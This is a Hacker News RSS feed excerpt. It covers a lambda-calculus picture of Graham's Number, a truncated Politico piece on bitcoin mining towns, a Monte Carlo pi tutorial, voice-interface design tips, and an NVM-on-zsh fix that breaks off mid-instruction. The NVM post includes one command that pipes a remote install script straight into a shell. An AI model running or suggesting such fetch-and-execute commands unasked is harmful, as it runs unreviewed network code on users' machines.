<div data-amp-layout="responsive"><figure><img data-attachment-id="632" data-permalink="https://mindsarentmagic.org/new-piskel-1-png/" data-orig-file="https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png" data-orig-size="1360,976" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Graham’s Number" data-image-description="<p>https://mindsarentmagic.org/2020/02/19/a-picture-of-grahams-number/</p>
" data-medium-file="https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=300" data-large-file="https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=750" src="https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=1024" alt="" srcset="https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=1024 1024w, https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=150 150w, https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=300 300w, https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png?w=768 768w, https://mindsarentmagic.files.wordpress.com/2020/02/new-piskel-1.png.png 1360w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>One of the first posts I made on this blog was <a href="https://mindsarentmagic.org/2012/11/22/lambda-graham/">Lambda calculus and Graham’s number</a>, which set out how to express the <a href="https://googology.wikia.org/wiki/Googology_Wiki">insanely large number</a> known as <a href="https://waitbutwhy.com/2014/11/1000000-grahams-number.html">Graham’s Number</a> precisely and concisely using lambda calculus.</p>



<p>A week ago, Reddit user <a href="https://www.reddit.com/user/KtoProd/">u/KtoProd</a> asked: if I wanted to get a Graham’s Number tattoo, how should I represent it? <a href="https://www.reddit.com/user/FavoriteColorFlavor/">u/FavoriteColorFlavor</a> linked to my lambda calculus post. But in a cool twist, they <a href="https://www.reddit.com/r/math/comments/f1mr5y/expressing_grahams_number/fh9qgtm/">suggested</a> that rather than writing these things in the usual way, they use a <a href="https://tromp.github.io/cl/diagrams.html">John Tromp lambda calculus diagram</a>. I got into the discussion and started working with the diagrams a bit, and they really are a great way to work with lambda calculus expressions; it was a pleasure to understand how the diagram relates to what I originally wrote, and manipulate it a bit for clarity.</p>



<p>The bars at the top are lambdas, the joining horizontal lines are applications, and the vertical lines are variables. There are three groups; the rightmost group represents the number 2, and the middle one the number 3; with beta reduction the two lambdas in the leftmost group will consume these rightmost groups and use them to build other small numbers needed here, like 4 (2<sup>2</sup>) and 64 (4<sup>3</sup>). The three is also used to make the two 3s either side of the arrows. Tromp’s <a href="https://tromp.github.io/cl/diagrams.html">page about these diagrams</a> has lots of examples.</p>



<p>I’m obviously biased, but this is my favourite of the suggestions in that discussion. If <a href="https://www.reddit.com/user/KtoProd/">u/KtoProd</a> does get it as a tattoo I hope I can share a picture with you all!</p>



<p>Update: <a href="https://mindsarentmagic.org/2020/02/24/some-more-numbers-as-lambda-calculus/">Some more numbers as lambda&nbsp;calculus</a></p>



<p>Update 2020-02-24: I’ve added the ability to generate these diagrams to my <a href="https://github.com/ciphergoth/pylambdac">Python lambda calculus toy</a>. After installation, try <code>./trylambda demofiles/draw.olc</code>.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			<div>
	
	<p>
		I'm Paul Crowley aka "ciphergoth", a cryptographer and programmer living in Mountain View, California. See also my Twitter feed, my webpages, my blogs on Dreamwidth and Livejournal, and my previous proper blog. Or mail me: paul at ciphergoth.org.		<a href="https://mindsarentmagic.org/author/ciphergoth/" rel="author">
			View more posts		</a>
	</p><!-- .author-description -->
</div><!-- .author-bio -->
	
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://mindsarentmagic.org/2020/02/19/a-picture-of-grahams-number/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213727</guid>
            <pubDate>Sun, 21 Feb 2021 14:41:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When Bitcoin miners take over a town (2018)]]>
            </title>
            <description>
<![CDATA[
Score 202 | Comments 469 (<a href="https://news.ycombinator.com/item?id=26213693">thread link</a>) | @edward
<br/>
February 21, 2021 | https://www.politico.eu/article/this-is-what-happens-when-bitcoin-miners-take-over-your-town/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/this-is-what-happens-when-bitcoin-miners-take-over-your-town/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									<p><span>EAST WENATCHEE,&nbsp;Washington — Hands on the&nbsp;</span>wheel, eyes squinting against the winter sun, Lauren Miehe eases his Land Rover down the main drag and tells me how he used to spot promising sites to build a bitcoin mine, back in 2013, when he was a freshly arrived techie from Seattle and had just discovered this sleepy rural community.</p>
<p>The attraction then, as now, was the Columbia River, which we can glimpse a few blocks to our left. Bitcoin mining — the complex process in which computers solve a complicated math puzzle to win a stack of virtual currency — uses an inordinate amount of electricity, and thanks to five hydroelectric dams that straddle this stretch of the river, about three hours east of Seattle, miners could buy that power more cheaply here than anywhere else in the nation. Long before locals had even heard the words “cryptocurrency” or “blockchain,” Miehe and his peers realized that this semi-arid agricultural region known as the Mid-Columbia Basin was the best place to mine bitcoin in America — and maybe the world.</p>
<p>The trick, though, was finding a location where you could put all that cheap power to work. You needed an existing building, because in those days, when bitcoin was trading for just a few dollars, no one could afford to build something new. You needed space for a few hundred high-speed computer servers, and also for the heavy-duty cooling system to keep them from melting down as they churned out the trillions of calculations necessary to mine bitcoin. Above all, you needed a location that could handle a lot of electricity — a quarter of a megawatt, maybe, or even a half a megawatt, enough to light up a couple hundred homes.</p>
<p>The best mining sites were the old fruit warehouses — the basin is as famous for its apples as for its megawatts — but those got snapped up early. So Miehe, a tall, gregarious 38-year-old who would go on to set up a string of mines here, learned to look for less obvious solutions. He would roam the side streets and back roads, scanning for defunct businesses that might have once used a lot of power. An old machine shop, say. A closed-down convenience store. Or this: Miehe slows the Land Rover and points to a shuttered carwash sitting forlornly next to a Taco Bell. It has the space, he says. And with the water pumps and heaters, “there’s probably a ton of power distributed not very far from here,” Miehe tells me. “That could be a bitcoin mine.”</p>
<blockquote><p>Over the past two years, the region has taken on the vibe of a boomtown.</p></blockquote>
<p>These days, Miehe says, a serious miner wouldn’t even look at a site like that. As bitcoin’s soaring price has drawn in <a href="https://www.politico.com/magazine/story/2018/03/09/how-bitcoin-works-illustration-infographic-217333" target="_blank">thousands of new players worldwide</a>, the strange math at the heart of this cryptocurrency has grown steadily more complicated. Generating a single bitcoin takes a lot more servers than it used to — and a lot more power. Today, a half-megawatt mine, Miehe says, “is nothing.” The commercial miners now pouring into the valley are building sites with tens of thousands of servers and electrical loads of as much as 30 megawatts, or enough to power a neighborhood of 13,000 homes. And in the arms race that cryptocurrency mining has become, even these operations will soon be considered small-scale. Miehe knows of substantially larger mining projects in the basin backed by out-of-state investors from Wall Street, Europe and Asia whose prospecting strategy, as he puts it, amounts to “running around with a checkbook just trying to get in there and establish scale.”</p>
<p>For years, few residents really grasped how appealing their region was to miners, who mainly did their esoteric calculations quietly tucked away in warehouses and basements. But those days are gone. Over the past two years, and especially during 2017, when the price of a single bitcoin&nbsp;<a href="https://99bitcoins.com/price-chart-history/" target="_blank" rel="noopener">jumped</a>&nbsp;from $1,000 to more than $19,000, the region has taken on the vibe of a boomtown. Across the three rural counties of the Mid-Columbia Basin — Chelan, Douglas and Grant — orchards and farm fields now share the rolling landscape with mines of every size, from industrial-scale facilities to repurposed warehouses to cargo containers and even backyard sheds. Outsiders are so eager to turn the basin’s power into cryptocurrency that this winter, several would-be miners from Asia flew their private jet into the local airport, took a rental car to one of the local dams, and, according to a utility official, politely informed staff at the dam visitors center, “We want to see the dam master because we want to buy some electricity.”</p>
<p>The Mid-Columbia Basin isn’t the only location where the virtual realm of cryptocurrency is colliding with the real world of megawatts and real estate. In places like China, Venezuela and Iceland, cheap land and even cheaper electricity have resulted in bustling mining hubs. But the basin, by dint of its early start, has emerged as one of the biggest boomtowns. By the end of 2018, according to some estimates, miners here could account for anywhere from 15 to 30 percent of all bitcoin mining in the world, and impressive shares of other cryptocurrencies, such as Ethereum and Ripple. And as with any boomtown, that success has created tensions. There have been disputes between miners and locals, bankruptcies and bribery attempts, lawsuits, even a kind of intensifying guerrilla warfare between local utility crews and a shadowy army of bootleg miners who set up their servers in basements and garages and max out the local electrical grids.</p>
<div id="attachment_846110"><p><img aria-describedby="caption-attachment-846110" loading="lazy" src="https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-714x476.jpg" alt="" width="714" height="476" srcset="https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-714x476.jpg 714w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-300x200.jpg 300w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-768x512.jpg 768w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-1024x683.jpg 1024w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-1160x773.jpg 1160w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-380x253.jpg 380w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-171x114.jpg 171w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-90x60.jpg 90w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-104x69.jpg 104w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-200x133.jpg 200w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-390x260.jpg 390w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-54x36.jpg 54w, https://www.politico.eu/wp-content/uploads/2018/03/h_54129347-1080x720.jpg 1080w" sizes="(max-width: 714px) 100vw, 714px"></p><p id="caption-attachment-846110">The Datacenter Mjoelnir in Iceland, a cryptocurrency mine run by Genesis-Mining | Hanna Andresdottir/EPA</p></div>
<p>More broadly, the region is watching uneasily as one of its biggest natural resources — a gigantic surplus of hydroelectric power — is inhaled by a sector that barely existed five years ago and which is routinely derided as the next dot-com bust, or this century’s version of the Dutch tulip craze, or, as&nbsp;New York Times&nbsp;columnist Paul Krugman&nbsp;<a href="https://twitter.com/paulkrugman/status/955107120671797248?lang=en" target="_blank" rel="noopener">put it in January</a>, a Ponzi scheme. Indeed, even as Miehe was demonstrating his prospecting chops, bitcoin’s price was already in a swoon that would touch $5,900 and rekindle widespread doubts about the future of virtual currencies.</p>
<p>For local cryptocurrency enthusiasts, these slings and arrows are all very much worth enduring. They believe not only that cryptocurrency will make them personally very wealthy, but also that this formerly out-of-the-way region has a real shot at becoming a center — and maybe&nbsp;<i>the&nbsp;</i>center — of a coming technology revolution, with the well-paid jobs and tech-fueled prosperity that usually flow only to gilded “knowledge” hubs like Seattle and San Francisco. Malachi Salcido, a Wenatchee building contractor who jumped into bitcoin in 2014 and is now one of the basin’s biggest players, puts it in sweeping terms. The basin, he tells me, is “building a platform that the entire world is going to use.”</p>
<p>And squarely between these two competing narratives are the communities of the Mid-Columbia Basin, which find themselves anxiously trying to answer a question that for most of the rest of us is merely an amusing abstraction: Is bitcoin for real?</p>
<p>***</p>
<p><b>A few miles from the shuttered carwash</b>, David Carlson stands at the edge of a sprawling construction site and watches workers set the roof on a&nbsp;<a href="https://www.youtube.com/watch?v=CfrjhflKGzQ" target="_blank" rel="noopener">Giga Pod</a>, a self-contained crypto mine that Carlson designed to be assembled in a matter of weeks. When finished, the prefabricated wood-frame structure, roughly 12 by 48 feet, will be equipped with hundreds of high-speed servers that collectively draw a little over a megawatt of power and, in theory, will be capable of producing around 80 bitcoins a month. Carlson himself won’t be the miner; his company, Giga-Watt, will run the pod as a hosting site for other miners. By summer, Giga-Watt expects to have 24 pods here churning out bitcoins and other cryptocurrencies, most of which use the same computing-intensive, cryptographically secured protocol called the blockchain. “We’re right where the rubber hits the road with blockchain,” Carlson shouts as we step inside the project’s first completed pod and stand between the tall rack of toaster-size servers and a bank of roaring cooling fans. The main use of blockchain technology now is to keep a growing electronic ledger of every single bitcoin transaction ever made. But many miners see it as the record-keeping mechanism of the future. “We’re where the blockchain goes from that virtual concept to something that’s real in the world,” says Carlson, “something that somebody had to build and is actually running.”</p>
<p>Granted, all that real-worlding and road-hitting is a little hard to visualize just now. The winter storms that have turned the Cascade Mountains a dazzling white have also turned the construction site into a reddish quagmire that drags at workers and equipment. There have also been permitting snafus, delayed utility hookups, and a lawsuit, recently settled, by impatient investors. But Carlson seems unperturbed. “They are actually making it work,” he told me earlier, referring to the mud-caked workers. “In a normal project, they might just say, ‘Let’s just wait till spring,’” Carlson adds. “But in bitcoin and blockchain, there is no stopping.” Indeed, demand for hosting services in the basin is so high that a desperate miner offered Carlson a Lamborghini if Carlson would bump him to the head of the pod waiting list. “I didn’t take the offer,” Carlson assures me. “And I like Lamborghinis!”</p>
<blockquote><p>Across the expanding bitcoin universe, lots of miners are turning their basements and spare bedrooms into jury-rigged data centers.</p></blockquote>
<p>Carlson has become the face of the Mid-Columbia Basin crypto boom. Articulate, infectiously optimistic, with graying hair and a trim beard, the Microsoft software developer-turned-serial entrepreneur has built a series of mines, made (and lost) several bitcoin fortunes and endured countless setbacks to become one of the region’s largest players. Other local miners credit Carlson for launching the basin’s boom, back in 2012, when he showed …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.politico.eu/article/this-is-what-happens-when-bitcoin-miners-take-over-your-town/">https://www.politico.eu/article/this-is-what-happens-when-bitcoin-miners-take-over-your-town/</a></em></p>]]>
            </description>
            <link>https://www.politico.eu/article/this-is-what-happens-when-bitcoin-miners-take-over-your-town/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213693</guid>
            <pubDate>Sun, 21 Feb 2021 14:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using the Monte-Carlo simulation to estimate the value of 𝛑]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26213651">thread link</a>) | @mhasbini
<br/>
February 21, 2021 | https://ahmadhamze.github.io/estimating-pie.html | <a href="https://web.archive.org/web/*/https://ahmadhamze.github.io/estimating-pie.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrap">
                <div id="blogContainer">
                    
                    
                    <p>
                        First of all let's talk briefly about what is a Monte-Carlo simulation.<br>
                        Simply put, it is a computational method that uses a large number of random samples to obtain a result. It is used in a
                        wide range of disciplines like mathematics, computer graphics and physical sciences.
                        In this blog, we will see how we can use this method to estimate the value of the mathematical constant 𝛑.
                    </p>

                    <!--If you put this header h3 inside the paragraph, css won't be able to identify the paragraph anymore!!!!-->
                    <h3>Concept</h3>
                    <p>
                        How can a large number of random samples be used to estimate 𝛑?<br>
                        Suppose we have a circle inscribed in a square, if we throw a pile of sand randomly on the square, some grains will end up
                        inside the circle and others will end up outside of it. This picture illustrates this concept,
                        the blue dots represent the grains that are inside the circle and the red ones represent the ones outside of it.<br>
                        <img src="https://ahmadhamze.github.io/images/mc-pie-best.png" alt="Card image cap"><br>
                        We can compute the proportion of grains that ended up inside the circle, this value equals the proportion of the circle in relation
                        to the square. In addition, the more grain of sands we throw onto the square the more accurate the estimation will be.<br>
                        But why is this true? The Monte-Carlo simulation is an example of the "Law of Large Numbers (LLN)", this is not the focus of this
                        blog, if you want to know more you can check this wikipedia article
                        <a href="https://en.wikipedia.org/wiki/Law_of_large_numbers" target="_blank" rel="noopener noreferrer">Law_of_large_numbers</a>.<br>
                        First, let's figure out what the proportion of the circle in relation to the square is.<br>
                        The area of the circle is 𝛑 × r <sup>2</sup>, where r <mo>=</mo> ½, on the other hand the area of the square is simply 1.<br>
                        Therefore the proportion we're lookoing for is <sup>(𝛑 ⁄ 4)</sup> ⁄ <sub>1</sub> <mo>=</mo> (𝛑 ⁄ <sub>4</sub>).<br>
                        The second value we're looking for is the proportion of the grains inside the circle. Denote "success" the number of these grains and "trials"
                        the total number of grains thrown, the proportion will be <sup>success</sup> ⁄ <sub>trials</sub>.<br>
                        Now, let's write the equation 𝛑 ⁄ <sub>4</sub> <mo>=</mo> <sup>success</sup> ⁄ <sub>trials</sub>, this is equivalent to
                        𝛑 <mo>=</mo> 4 × <sup>success</sup> ⁄ <sub>trials</sub>.<br>
                        There you go! What we have to do now is to simulate a lot of "trials" and see how many are "success" i.e. inside the circle.

                    </p>
                    <h3>Code</h3>
                    <p>
                        We will be creating an array containing many couples of variables representing the coordinates of each point (grain of sand),
                        then we calculate whether the point is within the disk or not (the disk center is (½,½)).
                        Each point <mrow>(x,y)</mrow> is a bivariate uniform random variable on the unit square,
                        <mrow>
                            <mi>(x,y)</mi> ∈
                            <mi>(0,1)<sup>2</sup></mi>
                        </mrow>
                        and the disk is defined by:<br>
                        <mrow>
                            <mi>{(x,y) ∈ ℝ <sup>2</sup>;</mi>
                            <mi>(x - ½)<sup>2</sup></mi>
                            <mo>+</mo>
                            <mi>(y - ½)<sup>2</sup></mi> ≤
                            <mi>(½)<sup>2</sup>}</mi>
                        </mrow>
                    </p>
                    <pre>                        <code>
                            import numpy as np

                            def monte_carlo_pi(trials):
                                b_uniform = ((np.random.uniform(0,1), np.random.uniform(0,1)) for _ in range(trials))
                                success = sum(((x - 0.5)**2 + (y - 0.5)**2 &lt;= 0.25 for x,y in b_uniform))
                                return 4 * (success/trials)
                        </code>
                    </pre>
                    <p>
                        The code above defines a function "monte_carlo_pi" that takes the number of random trials to generate as argument.<br>
                        The "b_uniform" is a generator containing "trials" amonut of random points all within the square. The "success" variable is
                        simply the number of points situated inside the circle. Finally the estimated value of 𝛑 is returned.  
                    </p>
                    <h3>Results</h3>
                    <p>
                        We expect the estimated value to be closer to 𝛑 when using larger number of trials.<br>
                        Let's see the result when using only 100 trials.<br>
                        <img src="https://ahmadhamze.github.io/images/pie_100.png" alt="Card image cap"><br>
                        We got 3.0 as an estimation, this is quite far from the value that we're mostly used to (e.g. <mn>3.141592654<mn>), so let's
                        increase the number of trials to 100,000<br>
                        <img src="https://ahmadhamze.github.io/images/pie_100,000.png" alt="Card image cap"><br>
                        Now we're at 3.13976, much better. Finally, let's try 1,000,000 trials
                        <img src="https://ahmadhamze.github.io/images/pie_1,000,000.png" alt="Card image cap"><br>
                        The estimation got even closer, we're at 3.144164.
                    </mn></mn></p>
                    <h3>Conclusion</h3>
                    <p>
                        The Monte-Carlo method got a decent approximation of 𝛑 when using 1,000,000 trials, so why not use even more trials?
                        How about 100 million? What about 100 billion?<br>
                        The theory states that the more trials we make the better the approximation, but obviously there is a limit when using computers.<br>
                        In addition, more trials will result in more computing time, in fact 100 million trials will give an estimation of <mn>3.14144576</mn>.<br>
                        A better result however, it took eight and a half minutes to complete.<br>
                        There are many ways to enhance the performance of our code, including using the Numba library and parallelization, this will be covered
                        in another blog.
                    </p>
                </div>
            </div></div>]]>
            </description>
            <link>https://ahmadhamze.github.io/estimating-pie.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213651</guid>
            <pubDate>Sun, 21 Feb 2021 14:29:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$BTT BitTorrent Token starts to get a steady rise]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213435">thread link</a>) | @chovybizzass
<br/>
February 21, 2021 | https://odysee.com/@chovy:a/screencast-2021-02-21-05.17.42:8 | <a href="https://web.archive.org/web/*/https://odysee.com/@chovy:a/screencast-2021-02-21-05.17.42:8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://odysee.com/@chovy:a/screencast-2021-02-21-05.17.42:8</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213435</guid>
            <pubDate>Sun, 21 Feb 2021 13:55:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing for Voice User Interfaces]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26213122">thread link</a>) | @allending
<br/>
February 21, 2021 | https://blog.snappymob.com/designing-for-voice-user-interfaces-principles-and-best-practices | <a href="https://web.archive.org/web/*/https://blog.snappymob.com/designing-for-voice-user-interfaces-principles-and-best-practices">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
		<div id="primary">
			<main id="main" role="main">
<article id="post-12">
	<!-- HEADER: .header-content -->
	<!-- .header-content -->

	<!-- BODY: .entry-content -->
	<div>
		<p>Most of the digital products we use today are designed for our eyes, simply because as highly visual beings, we rely on our sight a lot.</p>

<p>Whether we’re reading microcopy to understand what a button does, or scanning through textual instructions to familiarize with a new machine, interacting with devices using visual cues is what we’re very used to.</p>
<p>But what happens when visual feedback is secondary? How does that change the way we interact with interfaces, and the way they’re designed for us?</p>
<p>Voice User Interfaces (VUI) like Amazon Alexa and Google Assistant are designed differently from screen-first interfaces for many reasons — the main one being that the principles of spoken communication differ from those of written communication. Because of that, UX designers cannot approach voice-first interfaces the same way they do screen-first interfaces.</p>
<p>How and why should they be done differently? Let’s dive into some of the best practices in voice design.</p>
<h2><strong>Best Practices in Voice Design</strong></h2>
<p>According to <a href="https://developer.amazon.com/en-US/docs/alexa/alexa-design/get-started.html">Amazon’s Alexa Design Guide</a>, voice interfaces should be four things — adaptable, personal, relatable, and available. Both Amazon’s guide and <a href="https://developers.google.com/assistant/conversational/df-asdk/design">Google Assistant’s Conversation design guide</a> stress that voice-first skills should be natural and user-centric for a seamless experience.</p>
<p>Here’s a breakdown of the best practices in designing user experiences for voice user interfaces.</p>
<h3>1. Be Flexible and Receptive</h3>
<p>Language is dynamic. Let’s say a user wants to make a call, they can say <em>“Call X”</em>, <em>“Ring X”</em>, <em>“Get X on the phone”</em>, or a thousand more other variations that can be matched to the same “Call” intent. Your skill must be able to pick up on key details in varied utterances, even if there are multiple embedded in a single answer.</p>
<p>Sometimes, to save time, users may string multiple pieces of information in a single command or response to a question. For example, if one says…</p>
<p><em>“Set a reminder for my interview with Snappymob at 3pm tomorrow.”&nbsp;</em></p>
<p>…they likely don’t want to repeat any of the information they’ve already mentioned. It’d show a lack of receptiveness to follow the exchange with <em>“What time would you like to set your reminder for?”</em> or <em>“What’s the reminder for?”</em>, because then the user would have to repeat <em>“3pm”</em> or <em>“Interview with Snappymob”</em>.</p>
<p>When your interface is able to pick up on additional information that wasn’t asked for, and fill in the gaps unprompted, you create a more intuitive experience for your users.</p>
<h3>2. Ask Questions, One at a Time</h3>
<p>Simply speaking, users need to know when their cue is. With voice-activated devices, asking questions lets them know when they need to respond.</p>
<p>Phrasing in statements rather than questions, like <em>“Let me know where you would like to go.”</em> instead of <em>“Where would you like to go?”</em> makes it unclear if the user needs to prompt the next activity with an answer.</p>
<p>To avoid confusion on both sides, it’s also standard to ask for one piece of information at a time. For instance, asking a user <em>“What is your new contact’s name, mobile number, and email address?”</em> might cause information overload and make forming an answer difficult. Instead, ask single-answer questions to fill in the blanks one by one.</p>
<h3>3. Present Clear Options</h3>
<p>Unlike visual interfaces, with voice-first, users aren’t choosing from navigation menus they can visually scan through. Hence, it’s important to relay their options in a clear and concise manner. This is where you need to pay attention to language.</p>
<p>Syntax matters especially with distinguishing between either/or questions and yes/no questions. For example, <em>“Would you like twister fries or french fries to go with your meal?”</em> could sound like a yes or no question. Instead, to make the option prompt clearer, it could be phrased like <em>“Which side would you like: Twister fries or french fries?”</em>.</p>
<h3>4. Narrow Down to Only the Necessary</h3>
<p>This applies to both questions and choices. Text can be scanned through, but spoken words take time to relay — so be succinct.</p>
<p>Only ask for confirmation for actions with high importance, like making calls, sending text messages, and any action that involves recipients or monetary transactions.</p>
<p>Asking for unnecessary confirmation or making users reiterate information can easily frustrate them. For example, an <em>“Are you sure” </em>confirmation might not be necessary for simple commands like <em>“Turn off the lights”</em> or <em>“Tell me the current price for Bitcoin”</em>, but necessary for <em>“Send email” </em>and <em>“Call Cindy”</em>.</p>
<p>As for choices, make sure your users aren’t bombarded with ten choices at a time. Remember that unlike text, users can’t scan back and forth to digest a message with speech. Giving them too much information to process at a time will lead to more errors in comprehension and exchange.</p>
<h3>5. Restate Questions</h3>
<p>As mentioned before, on voice-first interfaces, users aren’t relying primarily on a visual navigation menu. So to make sure they know where they are, it’s always helpful to reinstate the questions they answer.</p>
<p>For example, when a user asks for the recipe for spaghetti bolognese, it’s clearer to respond with <em>“To make spaghetti bolognese, the ingredients are…”</em> instead of jumping straight into <em>“The ingredients are…”</em>. A simple restatement reassures the user that they’re getting the answer they’re looking for.</p>
<h3>6. Be Prepared for Blockers</h3>
<p>Being well-prepared includes being prepared for scenarios where things don’t go as planned. Here are some of the most common blockers to think ahead for when designing for voice user interfaces:</p>
<h3><strong>Corrections</strong></h3>
<p>When a VUI gets a piece of information wrong, users will naturally correct it with common phrases like <em>“No, I said-”</em> or a simply a reiteration of their command.</p>
<p>Your interface must be able to pick up on corrections, accept them instantaneously, and restate the command for confirmation.</p>
<h3><strong>Comprehension Failures</strong></h3>
<p>When the VUI fails to understand the user’s command, it’s important to handle the error with grace.</p>
<p>The standard way to approach this is with a statement followed by a repetition of the question, like <em>“Sorry, I didn’t catch that. Who would you like to share this link with?”</em>. This is to make it clear to the user that they should reiterate their answer following the cue.</p>
<h3><strong>Unavailable Functions</strong></h3>
<p>When a user asks for a function that doesn’t exist, instead of using the standard <em>“Sorry, I didn’t get that”</em> response repeatedly, let them know what can be done for them instead to move the conversation forward.</p>
<p>Here’s a scenario — a user says <em>“Cook me spaghetti”</em>. Instead of ending the exchange with “Sorry, I couldn’t understand that”, respond with <em>“I can only help you find recipes for spaghetti. Would you like me to look for the best ones?”.</em></p>
<h3><strong>Non-Responses</strong></h3>
<p>Sometimes users forget to answer, or abandon ship halfway through a conversation. Some other times, the VUI doesn’t pick up on the sound input. In situations like these, re-prompts are necessary to give the user another go at answering a question, in case the non-response wasn’t intended.</p>
<p>In the re-prompts, it’s important to restate where they left off, so they know where to pick up. For example, a user doesn’t respond after saying <em>“Set a reminder”</em>. The re-prompt should restate what the user’s intent was, and what they should do next, something like this — <em>“I can help you set a reminder. What would you like to be reminded for?”</em>.</p>
<h2><strong>Let Us Help You</strong></h2>
<p>Thinking of jumping on the voice-first bandwagon? Snappymob might be the agency you’re looking for.</p>
<p>Our team of expert designers and engineers are passionate about user experience and making products that delight. Talk to us and let us give you a boost in your next project!</p>
		<!-- Contact us CTA -->
		
		<!-- Post category tags-->
		<p><label>
				App Design			</label>
		</p>
		<!-- Social share -->
		
	</div><!-- .entry-content -->

	<!-- Disable meta footer --> 
	<!-- 	<footer class="entry-footer default-max-width">
</footer> -->
	<!-- .entry-footer -->

	<!-- Disable author detail -->
	<!-- -->
</article><!-- #post-${ID} -->
			</main><!-- #main -->
		</div><!-- #primary -->
	</div><div>
	  <div>
		
		<p>
			We understand that every project is unique. Contact us and we will get
			back to you with the next steps.
		  </p>
		
	  </div>
	</div></div>]]>
            </description>
            <link>https://blog.snappymob.com/designing-for-voice-user-interfaces-principles-and-best-practices</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213122</guid>
            <pubDate>Sun, 21 Feb 2021 12:55:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NVM Not Found?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213045">thread link</a>) | @iroleh
<br/>
February 21, 2021 | https://iroleh.tech/nvm-not-found | <a href="https://web.archive.org/web/*/https://iroleh.tech/nvm-not-found">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1613910712610/3FN9CZjBC.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><h2 id="nvm-not-found-after-pimping-terminal-with-oh-my-zsh">NVM Not Found after Pimping Terminal with oh-my-zsh?</h2>
<p>Have you finished configuring your terminal?<br>Looking so cool now, but while can't I make use of my favorite tools after the Pimp?</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613907119527/Bz4J7BwD1.png?auto=compress" alt="Screenshot_2021-02-21_12-27-41.png"></p>
<p>I have encountered this issue every time I pimp my terminal, so today I have decided to share with everyone how I did it.</p>
<p><strong>Why does this happen</strong></p>
<p>This happens because when installing NVM it adds code to <code>~/.bashrc</code>, as your default terminal now uses <code>zsh</code> and not bash it never reads ~/.bashrc and therefore never loads NVM.</p>
<p>To avoid this at installation, you can simply put <code>zsh</code> at the end of the curl command. </p>
<p>Example:</p>
<pre><code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | zsh
</code></pre>
<p>"In other words: this is NVMs fault, not yours."</p>
<p><strong>Solution:</strong></p>
<p>To fix this, all we need to do is tell the <code>~/.zshrc</code> to load <code>nvm</code> on the prompt.</p>
<p>From your terminal, open the <code>.zshrc</code> file with your favorite editor, <code>nano</code> will be just fine.</p>
<p><code>nano .zshrc</code></p>
<p>And paste the following line of command at the top:</p>
